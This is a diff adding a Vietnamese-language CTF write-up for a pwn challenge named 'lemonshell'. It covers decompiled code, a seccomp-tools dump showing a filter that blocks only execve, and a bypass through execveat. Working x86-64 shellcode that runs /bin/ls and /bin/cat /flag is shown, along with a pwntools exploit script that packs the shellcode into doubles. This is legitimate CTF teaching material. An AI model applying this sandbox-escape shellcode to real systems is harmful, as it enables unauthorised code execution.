@@ -1121,3 +1121,284 @@ lụm =))
 ![lum=))](/assets/images/lum.png)
 
 ref : ![ref](https://ctftime.org/writeup/39292)
+
+## lemonshell
+
+
+file [here](/assets/files/lemonshell.rar)
+
+### overview
+
+- đầu tiên là sử dụng ```mmap``` tạo 1 vùng nhớ mới với full quyền , tiếp theo mỗi lần ta sẽ được nhập 8 byte để thực thi shellcode 
+
+```cs
+void __fastcall __noreturn main(int a1, char **a2, char **a3)
+{
+  int v3; // eax
+  void (*v4)(const char *, ...); // rax
+  void (*v5)(const char *, ...); // [rsp+18h] [rbp-18h]
+  void (*v6)(const char *, ...); // [rsp+20h] [rbp-10h]
+
+  v3 = getpagesize();
+  v6 = (void (*)(const char *, ...))mmap(0LL, -v3 & 0x4000, 7, 34, -1, 0LL);
+  if ( !v6 )
+    __assert_fail("psc != NULL", "src/lemon.c", 0x6Bu, "main");
+  fflush(stdout);
+  while ( 1 )
+  {
+    v5 = v6;
+    do
+    {
+      v4 = v5;
+      v5 = (void (*)(const char *, ...))((char *)v5 + 8);
+    }
+    while ( (unsigned int)__isoc99_scanf("%lf", v4) );
+    v6("%lf");
+  }
+}
+```
+- hàm này có vẻ là setup cho ```seccomp```
+
+```cs
+unsigned __int64 sub_400890()
+{
+  int i; // [rsp+8h] [rbp-58h]
+  __int16 v2; // [rsp+10h] [rbp-50h] BYREF
+  __int16 *v3; // [rsp+18h] [rbp-48h]
+  __int16 v4; // [rsp+20h] [rbp-40h] BYREF
+  char v5; // [rsp+22h] [rbp-3Eh]
+  char v6; // [rsp+23h] [rbp-3Dh]
+  int v7; // [rsp+24h] [rbp-3Ch]
+  __int16 v8; // [rsp+28h] [rbp-38h]
+  char v9; // [rsp+2Ah] [rbp-36h]
+  char v10; // [rsp+2Bh] [rbp-35h]
+  int v11; // [rsp+2Ch] [rbp-34h]
+  __int16 v12; // [rsp+30h] [rbp-30h]
+  char v13; // [rsp+32h] [rbp-2Eh]
+  char v14; // [rsp+33h] [rbp-2Dh]
+  int v15; // [rsp+34h] [rbp-2Ch]
+  __int16 v16; // [rsp+38h] [rbp-28h]
+  char v17; // [rsp+3Ah] [rbp-26h]
+  char v18; // [rsp+3Bh] [rbp-25h]
+  int v19; // [rsp+3Ch] [rbp-24h]
+  __int16 v20; // [rsp+40h] [rbp-20h]
+  char v21; // [rsp+42h] [rbp-1Eh]
+  char v22; // [rsp+43h] [rbp-1Dh]
+  int v23; // [rsp+44h] [rbp-1Ch]
+  __int16 v24; // [rsp+48h] [rbp-18h]
+  char v25; // [rsp+4Ah] [rbp-16h]
+  char v26; // [rsp+4Bh] [rbp-15h]
+  int v27; // [rsp+4Ch] [rbp-14h]
+  unsigned __int64 v28; // [rsp+58h] [rbp-8h]
+
+  v28 = __readfsqword(0x28u);
+  setbuf(stdout, 0LL);
+  setbuf(stderr, 0LL);
+  if ( prctl(38, 1LL, 0LL, 0LL, 0LL) )
+    __assert_fail("prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == 0", "src/lemon.c", 0x43u, "setup");
+  v4 = 32;
+  v5 = 0;
+  v6 = 0;
+  v7 = 4;
+  v8 = 21;
+  v9 = 0;
+  v10 = 3;
+  v11 = -1073741762;
+  v12 = 32;
+  v13 = 0;
+  v14 = 0;
+  v15 = 0;
+  for ( i = 0; !i; i = 1 )
+  {
+    v16 = 21;
+    v17 = 1;
+    v18 = 0;
+    v19 = qword_601078;
+  }
+  v20 = 6;
+  v21 = 0;
+  v22 = 0;
+  v23 = 2147418112;
+  v24 = 6;
+  v25 = 0;
+  v26 = 0;
+  v27 = 332340;
+  v2 = 6;
+  v3 = &v4;
+  if ( prctl(22, 2LL, &v2, 0LL, 0LL) )
+    __assert_fail("prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &fprog, 0, 0) == 0", "src/lemon.c", 0x61u, "setup");
+  return __readfsqword(0x28u) ^ v28;
+}
+```
+
+- ở đây nó chỉ cấm mỗi ```execve``` thôi , vậy còn rất nhiều các syscall có thể hữu ích như ```orw```  hoặc openat , openat2 ....
+
+```cs
+ploi@PhuocLoiiiii:~/pwn/shellcode/byte$ seccomp-tools dump ./lemonshell.bin
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0005
+ 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0005: 0x06 0x00 0x00 0x00051234  return ERRNO(4660)
+```
+
+- tuy nhiên ở bài này mình sẽ sử dụng ```execveat``` 
+
+ở đây giá trị của ```dirfd``` được bỏ qua khi ```pathname``` là 1 đường dẫn tuyệt đối , nếu path là tương đối thì ```dirfd``` giá trị là ```AT_FDCWD``` , flag và envp sẽ là NULL , 
+
+```cs
+ int execveat(int dirfd, const char *pathname,
+                    char *const _Nullable argv[],
+                    char *const _Nullable envp[],
+                    int flags);
+```
+
+- argv là 1 mảng chứa các tham số 
+
+
+```cs
+char *argv[] = { "ls", NULL };
+execveat(AT_FDCWD, "/bin/ls", argv, NULL, 0);
+```
+
+tương đương với
+
+```cs
+/bin/ls
+```
+
+- ở bài này trước hết mình sẽ dùng 1 /bin/ls để biết tên file flag
+
+```cs
+   push 0x42
+    pop rax
+    inc ah
+    cqo
+
+    push rdx
+    movabs rdi, 0x2f
+    push rdi
+    push rsp
+    pop r12
+
+    push rdx
+    movabs rdi, 0x736c2f2f6e69622f
+    push rdi
+    push rsp
+    pop rsi
+
+    push rdx
+    push r12
+    push rsi
+    push rsp
+    pop rdx
+
+    xor rdi, rdi
+    mov r10, rdi
+    mov r8, rdi
+    syscall
+```
+
+- tiếp theo sẽ là đọc flag
+
+```cs
+ push 0x42
+    pop rax
+    inc ah
+    cqo
+
+    push rdx
+    movabs rdi, 0x67616c662f
+    push rdi
+    push rsp
+    pop r12
+
+    push rdx
+    movabs rdi, 0x7461632f6e69622f
+    push rdi
+    push rsp
+    pop rsi
+
+    push rdx
+    push r12
+    push rsi
+    push rsp
+    pop rdx
+
+    xor rdi, rdi
+    mov r10, rdi
+    mov r8, rdi
+    syscall
+```
+
+- ta cũng cần chú ý là mỗi lần ta chỉ được input 8 byte và nó sẽ đọc giá trị float , vậy ta có thể sử dụng : 
+
+```cs
+payload = str(struct.unpack('d', p64(addr))[0]).encode()
+###################################################################################
+payload = str(struct.unpack('d', b'\xff\xff\xff\xff\xff\xff\xff\xff')[0]).encode()
+```
+
+exp 
+
+```cs
+#!/usr/bin/python3
+
+from pwn import *
+
+context.binary = exe =  ELF('./lemonshell.bin')
+context.arch = 'amd64'
+from struct import unpack
+p = process()
+shellcode = asm(
+    """
+    push 0x42
+    pop rax
+    inc ah
+    cqo
+
+    push rdx
+    movabs rdi, 0x2f
+    push rdi
+    push rsp
+    pop r12
+
+    push rdx
+    movabs rdi, 0x736c2f2f6e69622f
+    push rdi
+    push rsp
+    pop rsi
+
+    push rdx
+    push r12
+    push rsi
+    push rsp
+    pop rdx
+
+    xor rdi, rdi
+    mov r10, rdi
+    mov r8, rdi
+    syscall
+    """,
+    endian='little',
+    arch="amd64",
+    bits=64
+)
+shellcode += b"\x90" * (8 - (len(shellcode) % 8))
+
+print(disasm(shellcode, arch="amd64"))
+
+for i in range(0, len(shellcode), 8):
+    data = shellcode[i:i + 8]
+    double = unpack('<d', data)[0]
+    input()
+    p.sendline(repr(double))
+
+p.sendline(b"a")
+p.interactive()
+```
+
+- ngoài ra mình cũng tìm thấy 1 shellcode thực thi /bin//sh tuy nhiên bằng 1 cách nào đó nó không hoạt động [here](https://shell-storm.org/shellcode/files/shellcode-905.html)
